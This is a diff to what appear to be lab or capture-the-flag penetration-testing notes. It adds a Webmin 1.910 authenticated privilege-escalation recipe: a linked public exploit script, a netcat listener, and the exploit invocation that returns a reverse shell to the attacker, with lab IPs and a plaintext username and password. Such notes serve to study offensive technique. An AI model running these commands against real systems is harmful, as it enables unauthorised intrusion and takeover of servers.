@@ -333,6 +333,28 @@ run
 [*] Command shell session 1 opened (10.10.14.2:8888 -> 10.10.110.3:10784) at 2024-04-13 21:21:53 -0400
 ```
 
+### Webmin Version 1.910 - Privilege Escalation
+
+* Authenticated
+* https://github.com/roughiz/Webmin-1.910-Exploit-Script
+* Start your virtual env
+
+```
+source venv/bin/activate
+```
+
+* start your listener
+
+```
+nc -nlvp 443
+```
+
+* Send it
+
+```
+python2 webmin_exploit.py --rhost 10.129.2.1 --rport 10000 --lhost 10.10.14.76 --lport 443 -u Matt -p computer2008 -s True
+```
+
 ### init.d linux pe
 
 *
